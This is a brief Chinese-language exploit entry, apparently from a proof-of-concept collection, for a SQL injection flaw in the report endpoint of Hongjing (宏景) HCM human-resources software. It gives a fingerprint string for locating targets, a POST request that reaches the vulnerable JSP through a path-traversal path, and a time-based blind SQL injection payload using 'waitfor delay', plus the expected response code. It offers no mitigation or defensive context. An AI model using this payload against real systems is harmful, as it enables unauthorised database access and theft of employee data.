# 宏景HCM-report接口SQL注入漏洞

宏景HCM-report接口 ｜ SQL注入 ｜ —
- **指纹**：`"宏景 HCM"`
- **请求**：`POST /templates/attestation/../../report/report_collect/report_org_collect_tree.jsp HTTP/1.1`

**Payload**
```
params=&isAction=2&cycle_id=2;waitfor%20delay%20'0:0:5'--%20
```
- **响应特征**：200